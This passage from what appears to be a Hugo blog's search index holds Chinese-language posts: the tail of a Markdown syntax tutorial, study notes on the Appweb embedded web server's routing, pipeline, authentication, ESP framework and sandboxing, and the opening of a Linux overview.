","date":"2019-12-01","objectID":"/basic-markdown-syntax/:8:1","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"有序列表 一系列项的列表, 其中项的顺序确实很重要. 1. Lorem ipsum dolor sit amet 2. Consectetur adipiscing elit 3. Integer molestie lorem at massa 4. Facilisis in pretium nisl aliquet 5. Nulla volutpat aliquam velit 6. Faucibus porta lacus fringilla vel 7. Aenean sit amet erat nunc 8. Eget porttitor lorem 呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem 输出的 HTML 看起来像这样: \u003col\u003e \u003cli\u003eLorem ipsum dolor sit amet\u003c/li\u003e \u003cli\u003eConsectetur adipiscing elit\u003c/li\u003e \u003cli\u003eInteger molestie lorem at massa\u003c/li\u003e \u003cli\u003eFacilisis in pretium nisl aliquet\u003c/li\u003e \u003cli\u003eNulla volutpat aliquam velit\u003c/li\u003e \u003cli\u003eFaucibus porta lacus fringilla vel\u003c/li\u003e \u003cli\u003eAenean sit amet erat nunc\u003c/li\u003e \u003cli\u003eEget porttitor lorem\u003c/li\u003e \u003c/ol\u003e 技巧 如果你对每一项使用 1., Markdown 将自动为每一项编号. 例如: 1. Lorem ipsum dolor sit amet 1. Consectetur adipiscing elit 1. Integer molestie lorem at massa 1. Facilisis in pretium nisl aliquet 1. Nulla volutpat aliquam velit 1. Faucibus porta lacus fringilla vel 1. Aenean sit amet erat nunc 1. Eget porttitor lorem 呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:8:2","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"任务列表 任务列表使你可以创建带有复选框的列表. 要创建任务列表, 请在任务列表项之前添加破折号 (-) 和带有空格的方括号 ([ ]). 要选择一个复选框，请在方括号之间添加 x ([x]). - [x] Write the press release - [ ] Update the website - [ ] Contact the media 呈现的输出效果如下: Write the press release Update the website Contact the media ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:8:3","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"9 代码 ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:9:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"行内代码 用 ` 包装行内代码段. 在这个例子中, `\u003csection\u003e\u003c/section\u003e` 会被包裹成 **代码**. 呈现的输出效果如下: 在这个例子中, \u003csection\u003e\u003c/section\u003e 会被包裹成 代码. 输出的 HTML 看起来像这样: \u003cp\u003e 在这个例子中, \u003ccode\u003e\u0026lt;section\u0026gt;\u0026lt;/section\u0026gt;\u003c/code\u003e 会被包裹成 \u003cstrong\u003e代码\u003c/strong\u003e. \u003c/p\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:9:1","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"缩进代码 将几行代码缩进至少四个空格，例如: // Some comments line 1 of code line 2 of code line 3 of code 呈现的输出效果如下: // Some comments line 1 of code line 2 of code line 3 of code 输出的 HTML 看起来像这样: \u003cpre\u003e \u003ccode\u003e // Some comments line 1 of code line 2 of code line 3 of code \u003c/code\u003e \u003c/pre\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:9:2","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"围栏代码块 使用 “围栏” ``` 来生成一段带有语言属性的代码块. ```markdown Sample text here... ``` 输出的 HTML 看起来像这样: \u003cpre language-html\u003e \u003ccode\u003eSample text here...\u003c/code\u003e \u003c/pre\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:9:3","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"语法高亮 GFMGitHub Flavored Markdown 也支持语法高亮. 要激活它，只需在第一个代码 “围栏” 之后直接添加你要使用的语言的文件扩展名, ```js, 语法高亮显示将自动应用于渲染的 HTML 中. 例如, 在以下 JavaScript 代码中应用语法高亮: ```js grunt.initConfig({ assemble: { options: { assets: 'docs/assets', data: 'src/data/*.{json,yml}', helpers: 'src/custom-helpers.js', partials: ['src/partials/**/*.{hbs,md}'] }, pages: { options: { layout: 'default.hbs' }, files: { './': ['src/templates/pages/index.hbs'] } } } }; ``` 呈现的输出效果如下: grunt.initConfig({ assemble: { options: { assets: 'docs/assets', data: 'src/data/*.{json,yml}', helpers: 'src/custom-helpers.js', partials: ['src/partials/**/*.{hbs,md}'] }, pages: { options: { layout: 'default.hbs' }, files: { './': ['src/templates/pages/index.hbs'] } } } }; 注意 Hugo 文档中的 语法高亮页面 介绍了有关语法高亮的更多信息, 包括语法高亮的 shortcode. ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:9:4","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"10 表格 通过在每个单元格之间添加竖线作为分隔线, 并在标题下添加一行破折号 (也由竖线分隔) 来创建表格. 注意, 竖线不需要垂直对齐. | Option | Description | | ------ | ----------- | | data | path to data files to supply the data that will be passed into templates. | | engine | engine to be used for processing templates. Handlebars is the default. | | ext | extension to be used for dest files. | 呈现的输出效果如下: Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. 输出的 HTML 看起来像这样: \u003ctable\u003e \u003cthead\u003e \u003ctr\u003e \u003cth\u003eOption\u003c/th\u003e \u003cth\u003eDescription\u003c/th\u003e \u003c/tr\u003e \u003c/thead\u003e \u003ctbody\u003e \u003ctr\u003e \u003ctd\u003edata\u003c/td\u003e \u003ctd\u003epath to data files to supply the data that will be passed into templates.\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003eengine\u003c/td\u003e \u003ctd\u003eengine to be used for processing templates. Handlebars is the default.\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003eext\u003c/td\u003e \u003ctd\u003eextension to be used for dest files.\u003c/td\u003e \u003c/tr\u003e \u003c/tbody\u003e \u003c/table\u003e 文本右对齐或居中对齐 在任何标题下方的破折号右侧添加冒号将使该列的文本右对齐. 在任何标题下方的破折号两边添加冒号将使该列的对齐文本居中. | Option | Description | |:------:| -----------:| | data | path to data files to supply the data that will be passed into templates. | | engine | engine to be used for processing templates. Handlebars is the default. | | ext | extension to be used for dest files. | 呈现的输出效果如下: Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:10:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"11 链接 ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:11:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"基本链接 \u003chttps://assemble.io\u003e \u003ccontact@revolunet.com\u003e [Assemble](https://assemble.io) 呈现的输出效果如下 (将鼠标悬停在链接上，没有提示): https://assemble.io contact@revolunet.com Assemble 输出的 HTML 看起来像这样: \u003ca href=\"https://assemble.io\"\u003ehttps://assemble.io\u003c/a\u003e \u003ca href=\"mailto:contact@revolunet.com\"\u003econtact@revolunet.com\u003c/a\u003e \u003ca href=\"https://assemble.io\"\u003eAssemble\u003c/a\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:11:1","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"添加一个标题 [Upstage](https://github.com/upstage/ \"Visit Upstage!\") 呈现的输出效果如下 (将鼠标悬停在链接上，会有一行提示): Upstage 输出的 HTML 看起来像这样: \u003ca href=\"https://github.com/upstage/\" title=\"Visit Upstage!\"\u003eUpstage\u003c/a\u003e ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:11:2","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"定位标记 定位标记使你可以跳至同一页面上的指定锚点. 例如, 每个章节: ## Table of Contents * [Chapter 1](#chapter-1) * [Chapter 2](#chapter-2) * [Chapter 3](#chapter-3) 将跳转到这些部分: ## Chapter 1 \u003ca id=\"chapter-1\"\u003e\u003c/a\u003e Content for chapter one. ## Chapter 2 \u003ca id=\"chapter-2\"\u003e\u003c/a\u003e Content for chapter one. ## Chapter 3 \u003ca id=\"chapter-3\"\u003e\u003c/a\u003e Content for chapter one. 注意 定位标记的位置几乎是任意的. 因为它们并不引人注目, 所以它们通常被放在同一行了. ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:11:3","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"12 脚注 脚注使你可以添加注释和参考, 而不会使文档正文混乱. 当你创建脚注时, 会在添加脚注引用的位置出现带有链接的上标编号. 读者可以单击链接以跳至页面底部的脚注内容. 要创建脚注引用, 请在方括号中添加插入符号和标识符 ([^1]). 标识符可以是数字或单词, 但不能包含空格或制表符. 标识符仅将脚注引用与脚注本身相关联 - 在脚注输出中, 脚注按顺序编号. 在中括号内使用插入符号和数字以及用冒号和文本来添加脚注内容 ([^1]：这是一段脚注). 你不一定要在文档末尾添加脚注. 可以将它们放在除列表, 引用和表格等元素之外的任何位置. 这是一个数字脚注[^1]. 这是一个带标签的脚注[^label] [^1]: 这是一个数字脚注 [^label]: 这是一个带标签的脚注 这是一个数字脚注1. 这是一个带标签的脚注2 ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:12:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Markdown"],"content":"13 图片 图片的语法与链接相似, 但包含一个在前面的感叹号. ![Minion](https://octodex.github.com/images/minion.png) 或者: ![Alt text](https://octodex.github.com/images/stormtroopocat.jpg \"The Stormtroopocat\") The StormtroopocatAlt text \" The Stormtroopocat 像链接一样, 图片也具有脚注样式的语法: ![Alt text][id] The DojocatAlt text \" The Dojocat 稍后在文档中提供参考内容, 用来定义 URL 的位置: [id]: https://octodex.github.com/images/dojocat.jpg \"The Dojocat\" 技巧 LoveIt 主题提供了一个包含更多功能的 图片的 shortcode. 这是一个数字脚注 ↩︎ 这是一个带标签的脚注 ↩︎ ","date":"2019-12-01","objectID":"/basic-markdown-syntax/:13:0","tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/basic-markdown-syntax/"},{"categories":["Tech"],"content":"总结整理一下Appweb重要的知识点。","date":"2021-05-31","objectID":"/2021/05/Appweb-1/","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"一、Appweb概述 Appweb是用于 Web 应用程序的嵌入式 Web 服务器。 它速度快，具备丰富的安全功能套件。 Appweb通过事件驱动的多线程内核托管对动态嵌入式 Web 应用程序进行了优化，可以提供快速响应、快速吞吐量和有效内存利用率。 它结构紧凑，只需使用 2MB 的内存（通常为 2-4MB）即可嵌入。 Appweb具有一组强大的功能，包括HTTP/1、HTTP/2、SSL/TLS、基本和摘要身份验证、虚拟主机、可加载模块、沙盒资源限制、日志记录、服务监控过程以及广泛的配置和编译控制。Appweb支持多种网络框架，包括ESP、PHP、Python、Perl 和 CGI。 作为部署最广泛的嵌入式 Web 服务器之一，Appweb被用于网络设备、电话、移动设备、消费和办公设备以及高速 Web 服务。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:1:0","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"二、Appweb的优势和特点 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:0","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"1. 快速开发 创建动态设备管理应用程序的最简单且最具成本效益的方式。它具有嵌入式 Web 应用程序所需的所有功能，因此开发和发布后维护成本将显着降低。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:1","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"2. 最小资源需求 快速和紧凑（最小需求仅2MB）。它只占用很少的系统资源，因此可以将重要的系统资源用于运行应用程序。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:2","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"3. 灵活的开发环境 高度模块化，因此按照不同需求选择不同的功能。它支持运行时模块加载和广泛的编译时控制，这对于希望重新编译源码的开发者来说十分有用。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:3","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"4. 安全性和可靠性 部署最广泛的嵌入式 Web 服务器之一，拥有大量用户对代码进行测试和优化。它有一个广泛的回归测试套件，对产品的压力测试远远超过正常环境中可能遇到的限制。完善的SSL/TLS、身份验证、沙盒指令和防御性策略等功能可最大程度保护用户免受攻击。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:4","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"5. 性能 具有事件驱动、多线程内核的同类产品中最快的性能。Appweb使用基于 arena 的内存分配器来防止内存泄漏并提供最高性能，在 PC 类设备上每秒可以处理超过 40,000 个请求。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:5","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"6. 规范性 支持 HTTP/1.0、HTTP/1.1、HTTP/2（仅限企业版）、CGI/1.1、SSL RFC 2246、HTTP RFC 2617等协议标准。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:6","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"7. 可移植性 Appweb 已移植到 Linux、Windows、Mac OS 和 BSD，并支持以下 CPU 架构：ARM、MIPS、i386/X86/X86_64、PowerPC、SH 和 Sparc。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:2:7","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"三、嵌入式设备应用 在嵌入式设备或应用中，web server功能的重要性次于设备必须运行的功能。因此，web server 必须最大限度地减少其资源需求，并且确定它放置在系统上的负载。 Appweb 根据这种特性进行深度优化： 快速并且只占用很小的内存资源（通常为2-4MB） 对系统资源的需求最小——通过可配置的资源限制 ESP C Web 框架在不影响开发人员功能的情况下，运行时效率最高 默认安全，开发安全 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:3:0","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"四、Appweb 内部组件 Appweb 的核心是一个事件驱动的、多线程的 HTTP pipe，在它上面加载模块以提供特定于内容的处理并扩展其功能。 Appweb 具有如下特点： 高性能多线程内核 动态模块加载的模块化结构 HTTP/1， HTTP/2 和WebSocket 支持 带有过滤器的灵活的请求pipeline 可以有效避免内存泄漏的快速的专用内存分配器和垃圾回收 可移植运行时 使用沙盒控制资源消耗 安全可靠的运行时可防止常见的安全漏洞，例如缓冲区溢出漏洞。 兼容Apache配置 全面的日志和调试跟踪 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:4:0","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"1. Routing Engine 在现代 Web 应用程序中，一般需要根据功能对应用程序的不同部分进行划分，并对各个部分进行不同的处理。 例如可能只想将访问权限限制为经过身份验证的用户，或者希望缓存一些缓慢变化但动态的数据的输出，或者可能想要使用 RESTful URI（其中 URI 的含义取决于 HTTP method）。 原因有很多，但 Web 服务器必须提供一种方法来以不同方式处理各种 URI 的处理， Appweb 同样提供了路由引擎来处理该问题。 Appweb 具有高效灵活的路由引擎，允许以不同方式处理（路由）URI group。 路由在 appweb.conf 配置文件中创建，使用 Route 定义一组适用于 URI 组的处理指令。 Route 指令指定符合条件的请求所必须匹配的 URI 前缀，匹配策略可以是一个简单的字符串或正则表达式。 可以创建任意数量的路由，并按照它们在 appweb.conf 文件中定义的顺序进行处理。 路由也可以嵌套，以便内部路由继承外部路由块的定义。 当收到请求时，它会测试各种路由并选择最好的路由来处理请求。在此过程中，路由可能会根据需要重定向或重写请求。 一个常规的路由块如下所示： \u003cRoute /info\u003e # match request URIs that begin with \"/info/\" Documents \"${DOCUMENT_ROOT}/info\" AuthType basic example.com # Use basic authentication Require secure # Must be accessed over SSL Require ability edit # Authenticated users must have the edit ability LimitRequestBody 100k # Only requests less than 100K are accepted RequestTimeout 10secs # Request must complete in \u003c 10 seconds RequestParseTimeout 2secs # Denial-of-service protection \u003c/Route\u003e 路由块中的部分常用指令如下： SetHandler —处理请求的请求handler (CGI, ESP, EJS, PHP, …) Documents — 服务内容所在目录 AuthType — 认证协议：basic, digest or web form Cache — 如何缓存响应 Redirect — 响应重定向 AddLanguageDir — 多语言内容 Compress —处理压缩的响应 Methods — 允许的请求方法 Require — 要求的用户凭据、规则或属性等 Limit* — 安全沙箱限制 SSLCertificateFile — SSL 配置 更多内容可以阅读 Appweb Request Routing 和 Appweb Configuration Directives. ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:4:1","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"2. Pipeline Engine Appweb 具备一个高效的、零拷贝的请求pipeline来处理请求，并生成对应的响应，这包括队列算法、数据包、缓冲区和时间调度。pipeline 的结构高度定制化，使用sendfile、异步 I/O 和向量化、离散/聚合的方式写入网络，以避免在写入网络之前在单个缓冲区中昂贵的数据和标头聚合消耗。 Nginx 企业 Web 服务器将性能提升到一个新的水平并在许多站点中取代了 Apache。但是嵌入式 Web 服务器一般要比常规的 web server 的守护进程处理速度上慢得多。虽然拥有千兆字节的内存会有助于提高 Web 服务器的速度，但使用正确的架构和内部设计更为重要。 Appweb 使用了嵌入式 Web 服务器的最佳实践，使得在嵌入式环境中也能取得与 Nginx 相同的处理速度。 与 Nginx 一样，Appweb 使用非阻塞、基于事件的设计来异步处理请求，客户端的每个请求无需使用专有进程或线程。当请求待处理时，Appweb 使用事件来为请求提供服务。所以每个 worker 线程可能会被许多请求共享，这种机制确保了快速响应，同时消耗较少的资源。 Appweb 将基于事件的内核与高效的 pipeline 相结合。pipeline 包含一个对输入和输出的数据进行处理的阶段，该阶段主要包含了各种各样的过滤器，这些过滤器会对数据进行分块、排列、上传和缓存。为了节省内存，pipeline会以数据包的形式进行数据传输，而不进行数据复制，数据包有效地携带数据包头或尾，以便数据可以在不复制的情况下进行封包，这对于高效的 HTTP 分块至关重要。 pipeline 与网络通信并使用平台上可用的最有效的 I/O 原语。 Appweb 支持向量套接字写入、sendfile 和快速 O/S 事件机制，如 kqueue 和 epoll， 这种架构极大地提升了处理速度并Web 服务器的“体型”娇小。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:4:2","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"3. Authentication Framework Appweb 集成了一个完整的认证框架，其中包含： 用户登录登出机制 安全密码传输 灵活密码存储 用户凭据验证 控制特定用户或用户组对资源的访问 Appweb 提供了3种认证协议：basic， digest 以及 web-form。如果用户使用 web-form 输入登录凭据，Appweb 会自动转换为SSL传输以确保传输安全。密码将被加密保存在一个平面文件(flat file)中或者使用本机操作系统的密码机制。 用户通过身份认证后，将获得一组“属性”的授权，这些是通过 Appweb 基于角色的授权方案为每个用户配置的。每个路由（一组 URI）都可以配置为在授予用户访问权限之前需要某些“属性”。 Appweb 的认证架构主要包含以下2个组件： 认证用户名/密码存储 认证协议 1. 认证用户名/密码存储 Appweb 有3种存储密码的方法： app - Application (custom) Password Database config - Configuration Directives in the app web.conf system - System Password Database app存储是用户应用程序将密码存储在数据库或其他自定义的存储密码的地方，用户应用程序负责实现凭据验证回调。Appweb 将调用该回调来访问自定义密码存储并将提供的凭据与用户密码进行比较。如果有需要在运行时修改用户和密码的需求，该种存储方法为首选项。使用该方法需要使用httpSetAuthVerifyByName API 来注册回调函数，此时注册的回调可以应用于所有的路由；如果使用httpSetAuthVerify API 注册回调，则只能应用于具体的某一个路由。 config 存储通过 Appweb 配置文件中的User指令来管理密码，authpass程序创建密码，并在appweb.conf中进行定义。在不需要动态添加、删除或编辑用户名或密码时可以使用该种方法。 system存储则是使用系统密码数据库(e.g. /etc/password) 具体使用何种存储方式由AuthStore指令指定。例如： AuthStore system 创建密码 创建密码使用authpass程序，如果使用应用程序定义数据库存储，则AuthStore应该设置成app，authpass程序创建的密码会存储在应用程序数据库中。 authpass的命令格式如下： authpass [--cipher blowfish|md5] [--file auth.conf] [--password word] realm username roles... --file filename 选项指定认证文件名称，如果未指定，密码将打印在标准输出上。 authpass 程序还可以修改配置文件中的密码定义。 --cipher 选项指定用于散列/加密密码的密码。 默认为 MD5，，但blowfish更安全。 Blowfish 更适用于 Basic 和 Form 身份验证方案。 如果未使用 --password 选项，authpass 将提示输入密码。 realm定义了一组密码，并通过 AuthType 指令设置，通常设置为公司域或产品名称。 注：身份验证文件必须存储在 Documents 目录或任何提供内容的目录之外。 2. 认证协议 认证协议定义了如何从用户处捕获用户凭据并提供给Appweb，Appweb 提供了不同的认证协议： Application Authentication 应用程序身份验证使用特定于应用程序的方式来捕获用户名和密码。用户应用程序负责实现控制逻辑以捕获用户凭据并通过登录和注销过程重定向客户端。此协议最适用于使用服务器端 Web 框架（如 ESP）的应用程序。 Web Form Authentication 表单身份验证方案使用 HTML Web 表单让用户输入用户名和密码凭据，并使用 HTTP Post 请求将凭据提交给服务器进行验证。 使用此协议，可以通过AuthType 指令定义特定的登录和注销页面。 Appweb 管理登录/注销过程，如果身份验证成功，则会创建登录会话并将 cookie 返回到客户端的浏览器，包含 cookie 的后续请求将被自动验证并提供服务。 要配置表单身份验证，AuthType 指令需要额外的参数来管理登录序列，包括指定登录网页、登录服务 URL、注销服务 URL、验证后显示的目标页面和注销后显示的目标页面。 格式为： AuthType form realm Login-Page Login-Service Logout-Service Logged-In-Destination Logged-Out-Destination 该指令定义在登录序列期间使用的 URL。该指令根据这些 URL 的要求创建请求路由，允许未经身份验证的用户访问登录页面和登录服务。这些 AuthType 参数中的每一个都是可选的，可以指定为空字符串\"\"以省略。 例如： \u003cRoute ^/\u003e AuthType form example.com /public/login.html /login /logout //public/login.html \u003c/Route\u003e \u003cRoute ^/public/\u003e Profix /public Document public AuthType none \u003c/Route\u003e 此示例为所有请求启用表单身份验证，并将客户端浏览器重定向到/public/login.html，用户可以输入用户名和密码。登录网页应将用户名和密码提交给绑定到/login URL的登录服务。当需要注销时，客户端应向绑定到/logout URL的注销服务提交 HTTP POST 请求。AuthType 指令中的最后两个字段是客户端浏览器在登录和注销后将重定向到的目标 URL。第二个 /public 路由无需身份验证即可访问“public”目录下的文档。 Login-Service 是绑定到内部服务的 URL，用于接收用户名和密码并对用户进行身份验证。此服务期望使用输入字段“用户名”和“密码”通过 POST 数据提交用户名/密码。可以通过在 AuthType 指令中为 Login-Service指定空字符串\"\"来提供自定义的登录和注销服务。如果使用自定义的登录服务，则应该调用httpLogin以根据配置的密码存储验证用户。 Web Form 这是一个最小示例登录页面： \u003chtml\u003e\u003chead\u003e\u003ctitle\u003elogin.html\u003c/title\u003e\u003c/head\u003e \u003cbody\u003e \u003cp\u003ePlease log in\u003c/p\u003e \u003cform name=\"details\" method=\"post\" action=\"/auth/login\" \u003e username \u003cinput type=\"text\" name=\"username\" value=''\u003e\u003cbr/\u003e password \u003cinput type=\"password\" name=\"password\" value=''\u003e\u003cbr/\u003e \u003cinput type=\"submit\" name=\"submit\" value=\"OK\"\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 提交的两个字段必须命名为username和password以供“表单”身份验证方案使用。 如果登录尝试成功，客户端将收到包含会话 cookie 的响应，并将被重定向到目标 URL。如果目标 URL 包含一个referrer:前缀并且登录请求在 HTTP 标头中包含一个引用 URL，那么该引用 URL 将用作目标而不是硬连接目标。 注：“表单”身份验证机制以纯文本形式提交用户密码。为确保通信安全，应在使用 TLS/SSL 的安全连接上使用“表单”身份验证方案。 Basic Authentication Digest Authentication Basic 和 Digest 身份验证是 HTTP/1.1 RFC2616 规范定义的 HTTP 协议机制。因为它们在 HTTP 协议级别运行，所以功能简单，且灵活性差。当客户端尝试访问受保护的内容时，客户端的浏览器会显示一个通用弹出对话框以提示用户输入凭据。 应该只将基本和摘要式身份验证用作最后的手段。 Basic 和 Digest 身份验证标准使用弱密码，通过网络重复发送凭据，并且不够安全。基本身份验证在每个请求中以明文形式传输密码。摘要式身份验证使用弱 MD5 密码，并且两者都要求对所有请求使用 SSL 以确保最低限度的安全。此外，Basic 和 Digest 都不提供可靠的注销机制。注销适用于某些浏览器，但不适用于其他浏览器甚至同一浏览器的不同版本。 Appweb 身份验证框架十分全面，使开发人员不必将各个部分进行拼凑组合成一个认证方案。更为详细的内容可以参考Authentication。 3. web框架 如果使用 ESP、PHP 或其他 Web 框架，则不应将扩展的AuthType form指令与 URL 一起使用。这是因为这些 web 框架集成了登录工具，在 web 框架中使用起来更自然。扩展的 AuthType form指令适合使用静态网页的网站，因为它可以在登录期间无缝管理浏览器页面转换。使用 ESP Web 框架时，请选择使用AuthType app身份验证协议。 4. SSL加密 在考虑对发送或接收来自应用程序的敏感信息时，有两种基本的安全策略： 保证整个应用","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:4:3","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"4. Embedded Server Pages ESP web Framework 可以说是 Appweb 中最优秀的部分，它是一个典型的MVC框架，可以容易地创建快速、动态的web应用。ESP是一个基于C的web框架，但不像一般的C编码，ESP框架的web页面支持嵌入式C编码。甚至，它支持网页修改时动态透明的重新编译和重新加载。它还检测并自动重新编译修改后的 ESP 控制器（用 C 编写）。这使得 ESP 的行为就像一个脚本化的 Web 框架。 为了解决C语言常见的内存分配和内存泄漏问题，ESP 使用了垃圾回收器在请求处理完成后来自动释放内存。 ESP 框架提供了一个应用生成器、web 页面模板引擎、MVC 框架、 HTML 控制库和 API 扩展来创建 web 应用程序。 ESP 应用程序通常定义在一组目录中： cache — 缓存预编译的 ESP 控制器和页面 client — 客户端 web 页内容、图片、样式等 controllers — ESP 控制器方法 layouts — 主页面布局 db — 数据库和数据库迁移 可以使用以下命令来快速创建一个新的 ESP 应用程序： mkdir blog cd blog esp install esp-html-mvc 关于 ESP 框架的内容十分丰富，可以单独拿出来详细说明，给出官网文档 ESP Docs。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:4:4","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"五、安全性 web server 通常通过数量众多的安全测试来保证安全性，但是作用甚微，构建一个设计安全的 web server 远比通过测试保证安全的方式更有效。对于嵌入式 web server 更难保证安全性，因为要在低内存占用和不降低性能的前提下进行。 Appweb 通过使用一个安全的 Portable Runtime (MPR)， 从一开始就重点保证安全性。MPR 是一个跨平台层，它使得 Appweb 的超过97%的代码都是可移植的。它包括许多帮助创建安全应用的机制，比如它包括一个安全的字符串和缓冲区处理模块，以帮助消除困扰许多产品的缓冲区溢出问题。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:5:0","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"六、沙箱 Appweb 引入沙箱来严格控制对系统资源的占用。这意味着在严格控制的范围内运行 Web 服务器，以便请求错误不会影响系统操作。 Appweb 还针对几种常见的拒绝服务攻击进行了加固。 Appweb 根据不同需求可做如下配置： 限制内存使用并且不允许超过内存限制的预定义的数值 拒绝过大的请求 拒绝过长的URL 由指定的用户帐户或用户组运行 基于以上基础，Appweb 提供了 Secure Sockets Layer 和摘要认证以及防御策略。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:6:0","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"从0到无穷学习Linux操作系统相关内容","date":"2021-01-02","objectID":"/2021/Linux/description/","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2021/Linux/description/"},{"categories":["Tech"],"content":"Linux操作系统的大千世界 – 综述 ","date":"2021-01-02","objectID":"/2021/Linux/description/:0:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2021/Linux/description/"},{"categories":["Tech"],"content":"前言 